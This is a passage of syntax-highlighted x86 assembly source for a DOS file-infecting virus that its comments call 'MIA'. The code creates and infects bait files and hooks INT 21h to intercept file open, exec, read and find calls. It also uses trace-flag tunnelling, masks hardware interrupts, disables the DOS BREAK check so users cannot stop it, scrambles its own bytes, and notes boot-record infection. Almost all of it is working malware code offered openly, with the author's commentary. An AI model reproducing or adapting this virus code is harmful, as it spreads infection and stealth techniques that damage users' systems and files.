 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">20h</span><span class="sc0">                 </span><span class="sc1">; With archive attribute</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0010h</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Bait</span><span class="sc0">         </span><span class="sc1">; DS:DX = ASCIZ filename to create</span><span class="sc0">
 </span><span class="sc6">pop</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">
 </span><span class="sc6">int</span><span class="sc0">    </span><span class="sc2">03h</span><span class="sc0">
 </span><span class="sc6">xchg</span><span class="sc0">   </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
 </span><span class="sc6">sbb</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0002h</span><span class="sc0">               </span><span class="sc1">; CX = 0002h = file has just been created</span><span class="sc0">
 </span><span class="sc6">jnz</span><span class="sc0">    </span><span class="sc5">Surpass</span><span class="sc0">                </span><span class="sc1">; Error? file exists or disk is write-protected</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">cs</span><span class="sc0">
 </span><span class="sc6">pop</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc5">VirVxD</span><span class="sc0">              </span><span class="sc1">; 40 bytes</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Program</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">RightWrite</span><span class="sc0">             </span><span class="sc1">; Write some fake codes</span><span class="sc0">
 </span><span class="sc6">pushf</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3Eh</span><span class="sc0">
 </span><span class="sc6">int</span><span class="sc0">    </span><span class="sc2">03h</span><span class="sc0">                    </span><span class="sc1">; Close file</span><span class="sc0">
 </span><span class="sc6">popf</span><span class="sc0">
 </span><span class="sc6">jnz</span><span class="sc0">    </span><span class="sc5">Unlink</span><span class="sc0">
 </span><span class="sc6">jmp</span><span class="sc0">    </span><span class="sc5">Macron</span><span class="sc0">                 </span><span class="sc1">; and infect it!</span><span class="sc0">


                     </span><span class="sc9">SubTtl</span><span class="sc0"> </span><span class="sc5">Expectes</span><span class="sc0"> </span><span class="sc5">alteri</span><span class="sc0"> </span><span class="sc5">quod</span><span class="sc0"> </span><span class="sc5">feceris</span><span class="sc0">!


</span><span class="sc5">Unlink</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">41h</span><span class="sc0">                 </span><span class="sc1">; Delete the file, huh!</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">
 </span><span class="sc6">int</span><span class="sc0">    </span><span class="sc2">03h</span><span class="sc0">

</span><span class="sc5">Surpass</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Flop</span><span class="sc0">                   </span><span class="sc1">; Restore registers</span><span class="sc0">

</span><span class="sc5">Request</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Frantic</span><span class="sc0">                </span><span class="sc1">; Restore INT 03h and dispatch INT 24h</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Backbreak</span><span class="sc0">              </span><span class="sc1">; Restore extended BREAK state</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Swapper</span><span class="sc0">                </span><span class="sc1">; Patch INT 21h</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Freeware</span><span class="sc0">               </span><span class="sc1">; Allow boot-record infection</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Scramble</span><span class="sc0">               </span><span class="sc1">; Garble some bytes</span><span class="sc0">


</span><span class="sc5">End_Cloak</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">02h</span><span class="sc0">


</span><span class="sc5">Achieve</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">popf</span><span class="sc0">
 </span><span class="sc6">retf</span><span class="sc0">   </span><span class="sc2">0002h</span><span class="sc0">                  </span><span class="sc1">; Return normally as nothing happened</span><span class="sc0">

</span><span class="sc5">Clueless</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
 </span><span class="sc6">pop</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Rand16</span><span class="sc0">                 </span><span class="sc1">; Obtain random word value</span><span class="sc0">
 </span><span class="sc6">xor</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ExOr</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">03h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
 </span><span class="sc6">pop</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Frantic</span><span class="sc0">                </span><span class="sc1">; Restore INT 03h and dispatch INT 24h</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Scramble</span><span class="sc0">               </span><span class="sc1">; Garble some bytes</span><span class="sc0">

</span><span class="sc5">Tunnel</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Flip</span><span class="sc0">                   </span><span class="sc1">; Push all registers</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">cs</span><span class="sc0">
 </span><span class="sc6">pop</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">
 </span><span class="sc6">in</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">21h</span><span class="sc0">                 </span><span class="sc1">; Get PIC 1 status</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">IRQ</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
 </span><span class="sc6">in</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0A1h</span><span class="sc0">                </span><span class="sc1">; Get PIC 2 status</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">IIO</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
 </span><span class="sc6">stc</span><span class="sc0">
 </span><span class="sc5">setalc</span><span class="sc0">                        </span><span class="sc1">; Mask all bits</span><span class="sc0">
 </span><span class="sc6">out</span><span class="sc0">    </span><span class="sc2">21h</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">                 </span><span class="sc1">; Disable IRQ 0 - 7</span><span class="sc0">
 </span><span class="sc6">out</span><span class="sc0">    </span><span class="sc2">0A1h</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">                </span><span class="sc1">; Disable IRQ 8 - 15</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Backbreak</span><span class="sc0">              </span><span class="sc1">; Restore extended BREAK state</span><span class="sc0">
 </span><span class="sc6">neg</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc0">                     </span><span class="sc1">; AL = 01h</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Tracer</span><span class="sc0">       </span><span class="sc1">; Set INT 01h vector</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Vectorize</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">cs</span><span class="sc0">
 </span><span class="sc6">xchg</span><span class="sc0">   </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                  </span><span class="sc1">; BX = zero</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ss</span><span class="sc4">:</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">13h</span><span class="sc4">],</span><span class="sc2">06h</span><span class="sc0">

</span><span class="sc5">Flags</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">01h</span><span class="sc0">

 </span><span class="sc6">pop</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">27h</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">       </span><span class="sc1">; Store original INT 01h offset</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">29h</span><span class="sc4">],</span><span class="sc8">cx</span><span class="sc0">       </span><span class="sc1">; Store original INT 01h segment</span><span class="sc0">

 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">2Bh</span><span class="sc4">],</span><span class="sc2">0FDh</span><span class="sc0">
 </span><span class="sc6">xor</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Trapper</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">01h</span><span class="sc4">],</span><span class="sc2">0F828h</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Flop</span><span class="sc0">
 </span><span class="sc6">popf</span><span class="sc0">                          </span><span class="sc1">; Trace flag is now turned on</span><span class="sc0">
 </span><span class="sc6">jmp</span><span class="sc0">    </span><span class="sc5">VirEnd</span><span class="sc0">                 </span><span class="sc1">; Original INT 21h... </span><span class="sc0">


</span><span class="sc1">;ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ[ Interrupt 21h handler ]ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ</span><span class="sc0">

  
</span><span class="sc5">Trapper</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">add</span><span class="sc0">    </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc2">0004h</span><span class="sc0">               </span><span class="sc1">; Throw off caller's CS &amp; IP (but keep flags)</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Swapper</span><span class="sc0">                </span><span class="sc1">; Dispatch INT 21h</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">


</span><span class="sc1">;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ</span><span class="sc0">
</span><span class="sc1">; Here MIA goes, disables DOS extended BREAK check, MIA doesn't disable IRQ 1</span><span class="sc0">
</span><span class="sc1">; guess why? I just experienced a keyboard halt when Ctrl-BREAK is pressed at</span><span class="sc0">
</span><span class="sc1">; the time after IRQ 1 is disabled  (when I was tracing instructions with the</span><span class="sc0">
</span><span class="sc1">; 'T' command within DEBUG.EXE environment).  I just didn't know, still don't</span><span class="sc0">
</span><span class="sc1">; know answer to this case, hmmm, could You find the answer, My friend?</span><span class="sc0">
</span><span class="sc1">;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹</span><span class="sc0">


 </span><span class="sc6">pushf</span><span class="sc0">                         </span><span class="sc1">; Remember, at this point IF=0</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">cs</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3300h</span><span class="sc0">               </span><span class="sc1">; Get extended BREAK state into DL</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">VirEnd</span><span class="sc0">                 </span><span class="sc1">; Continue INT 21h execution, don't call INT 21h</span><span class="sc0">
 </span><span class="sc6">pushf</span><span class="sc0">                         </span><span class="sc1">; directly, 'cause the previous handler will</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">cs</span><span class="sc0">                     </span><span class="sc1">; be executed twice!</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">Breakstate</span><span class="sc4">],</span><span class="sc8">dl</span><span class="sc0">     </span><span class="sc1">; Store extended BREAK state</span><span class="sc0">
 </span><span class="sc6">inc</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
 </span><span class="sc6">cwd</span><span class="sc0">                           </span><span class="sc1">; Convert word into doubleword</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">VirEnd</span><span class="sc0">                 </span><span class="sc1">; Set extended BREAK = OFF (prevents the user</span><span class="sc0">
 </span><span class="sc6">pop</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">                     </span><span class="sc1">; from disabling MIA's INT 21h redirector)</span><span class="sc0">

 </span><span class="sc6">cld</span><span class="sc0">                           </span><span class="sc1">; Forgetting to clear DF will mess things up!!!</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">FuncTab</span><span class="sc0">      </span><span class="sc1">; "Table of contents"</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">sp</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ss</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">07h</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; Get hi-byte of flags on entry to viral handler</span><span class="sc0">
 </span><span class="sc6">or</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">                 </span><span class="sc1">; Set TF</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">Flags</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">          </span><span class="sc1">; Store it</span><span class="sc0">

</span><span class="sc5">Selector</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0">     </span><span class="sc2">2Eh</span><span class="sc0">                    </span><span class="sc1">; CS: prefix</span><span class="sc0">
 </span><span class="sc6">lodsb</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc8">ss</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">05h</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">       </span><span class="sc1">; Compare with requested function</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0">     </span><span class="sc2">2Eh</span><span class="sc0">                    </span><span class="sc1">; CS: prefix</span><span class="sc0">
 </span><span class="sc6">lodsw</span><span class="sc0">
 </span><span class="sc6">je</span><span class="sc0">     </span><span class="sc5">Findfunc</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Flop</span><span class="sc0">         </span><span class="sc1">; No function matched?</span><span class="sc0">
 </span><span class="sc6">jb</span><span class="sc0">     </span><span class="sc5">Selector</span><span class="sc0">               </span><span class="sc1">; Not yet, loop</span><span class="sc0">
 </span><span class="sc6">pop</span><span class="sc0">    </span><span class="sc8">bp</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
 </span><span class="sc6">jmp</span><span class="sc0">    </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">Tunnel</span><span class="sc0">


                           </span><span class="sc9">SubTtl</span><span class="sc0"> </span><span class="sc5">Fide</span><span class="sc0"> </span><span class="sc5">et</span><span class="sc0"> </span><span class="sc5">sedulites</span><span class="sc0">


</span><span class="sc5">Findfunc</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">ss</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0Ch</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; SS:[BP+0Ch] = INT 21h caller's flags</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ss</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">06h</span><span class="sc4">],</span><span class="sc8">si</span><span class="sc0">       </span><span class="sc1">; SS:[BP+06h] = Viral flags</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Rapidformat</span><span class="sc4">],</span><span class="sc2">0EBh</span><span class="sc0">
 </span><span class="sc6">xchg</span><span class="sc0">   </span><span class="sc8">ss</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">04h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">; Restore AX, replace with the offset address</span><span class="sc0">
 </span><span class="sc6">pop</span><span class="sc0">    </span><span class="sc8">bp</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Scramble</span><span class="sc0">               </span><span class="sc1">; Decrypt some bytes</span><span class="sc0">
 </span><span class="sc6">jmp</span><span class="sc0">    </span><span class="sc5">Frantic</span><span class="sc0">                </span><span class="sc1">; Set INT 03h vector and patch INT 24h</span><span class="sc0">

</span><span class="sc5">Flip</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">bx</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">cx</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">dx</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">si</span><span class="sc0">                     
 </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">di</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">bp</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">ds</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">es</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">sp</span><span class="sc0">                  </span><span class="sc1">; Point BP to stack pointer</span><span class="sc0">
 </span><span class="sc6">xchg</span><span class="sc0">   </span><span class="sc8">ss</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">; Swap return IP with AX</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">ax</span><span class="sc0">                     </span><span class="sc1">; And push it</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ss</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; Restore AX</span><span class="sc0">
 </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc1">;ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ[ INT 21h functions handler table ]ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ</span><span class="sc0">


</span><span class="sc5">FuncTab</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0">     </span><span class="sc2">00h</span><span class="sc0">                    </span><span class="sc1">; Terminate program, similar to INT 20h</span><span class="sc0">
 </span><span class="sc9">dw</span><span class="sc0">     </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Revenge</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0">     </span><span class="sc2">0Eh</span><span class="sc0">                    </span><span class="sc1">; Set default drive number to DL</span><span class="sc0">
 </span><span class="sc9">dw</span><span class="sc0">     </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Dropper</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0">     </span><span class="sc2">11h</span><span class="sc0">                    </span><span class="sc1">; Find first matching file via FCB</span><span class="sc0">
 </span><span class="sc9">dw</span><span class="sc0">     </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Impulsive</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0">     </span><span class="sc2">12h</span><span class="sc0">                    </span><span class="sc1">; Find next matching file via FCB</span><span class="sc0">
 </span><span class="sc9">dw</span><span class="sc0">     </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Impulsive</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0">     </span><span class="sc2">19h</span><span class="sc0">                    </span><span class="sc1">; Get current default drive number into AL</span><span class="sc0">
 </span><span class="sc9">dw</span><span class="sc0">     </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Internal</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0">     </span><span class="sc2">25h</span><span class="sc0">                    </span><span class="sc1">; Set interrupt (AL) vector</span><span class="sc0">
 </span><span class="sc9">dw</span><span class="sc0">     </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Rehook</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0">     </span><span class="sc2">3Ch</span><span class="sc0">                    </span><span class="sc1">; Create a new file (truncate if it exists)</span><span class="sc0">
 </span><span class="sc9">dw</span><span class="sc0">     </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Creative</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0">     </span><span class="sc2">3Dh</span><span class="sc0">                    </span><span class="sc1">; Open file, returns AX = handle</span><span class="sc0">
 </span><span class="sc9">dw</span><span class="sc0">     </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Multitude</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0">     </span><span class="sc2">3Eh</span><span class="sc0">                    </span><span class="sc1">; Close file handle BX</span><span class="sc0">
 </span><span class="sc9">dw</span><span class="sc0">     </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Freehand</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0">     </span><span class="sc2">3Fh</span><span class="sc0">                    </span><span class="sc1">; Read CX bytes of file to DS:DX via handle BX</span><span class="sc0">
 </span><span class="sc9">dw</span><span class="sc0">     </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Fervour</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0">     </span><span class="sc2">40h</span><span class="sc0">                    </span><span class="sc1">; Write CX bytes data DS:DX to file via handle BX</span><span class="sc0">
 </span><span class="sc9">dw</span><span class="sc0">     </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Fervour</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0">     </span><span class="sc2">41h</span><span class="sc0">                    </span><span class="sc1">; Delete (unlink) file at DS:DX</span><span class="sc0">
 </span><span class="sc9">dw</span><span class="sc0">     </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Multitude</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0">     </span><span class="sc2">42h</span><span class="sc0">                    </span><span class="sc1">; Lseek file CX:DX via handle BX</span><span class="sc0">
 </span><span class="sc9">dw</span><span class="sc0">     </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Pointseek</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0">     </span><span class="sc2">43h</span><span class="sc0">                    </span><span class="sc1">; Get/put file attributes</span><span class="sc0">
 </span><span class="sc9">dw</span><span class="sc0">     </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Multitude</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0">     </span><span class="sc2">44h</span><span class="sc0">                    </span><span class="sc1">; DOS I/O control</span><span class="sc0">
 </span><span class="sc9">dw</span><span class="sc0">     </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">IO_Control</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0">     </span><span class="sc2">48h</span><span class="sc0">                    </span><span class="sc1">; Allocate memory block</span><span class="sc0">
 </span><span class="sc9">dw</span><span class="sc0">     </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Removable</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0">     </span><span class="sc2">49h</span><span class="sc0">                    </span><span class="sc1">; Free memory block</span><span class="sc0">
 </span><span class="sc9">dw</span><span class="sc0">     </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Freelance</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0">     </span><span class="sc2">4Ah</span><span class="sc0">                    </span><span class="sc1">; Resize memory block</span><span class="sc0">
 </span><span class="sc9">dw</span><span class="sc0">     </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Freelance</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0">     </span><span class="sc2">4Bh</span><span class="sc0">                    </span><span class="sc1">; Load and/or exec program DS:DX, parm ES:[BX]</span><span class="sc0">
 </span><span class="sc9">dw</span><span class="sc0">     </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Multitude</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0">     </span><span class="sc2">4Ch</span><span class="sc0">                    </span><span class="sc1">; Terminate current process with return code AL</span><span class="sc0">
 </span><span class="sc9">dw</span><span class="sc0">     </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Revenge</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0">     </span><span class="sc2">4Eh</span><span class="sc0">                    </span><span class="sc1">; Find first matching file DS:DX with CX attrib.</span><span class="sc0">
 </span><span class="sc9">dw</span><span class="sc0">     </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Underground</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0">     </span><span class="sc2">4Fh</span><span class="sc0">                    </span><span class="sc1">; Find next matching previous file</span><span class="sc0">
 </span><span class="sc9">dw</span><span class="sc0">     </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Underground</span><span class="sc0">
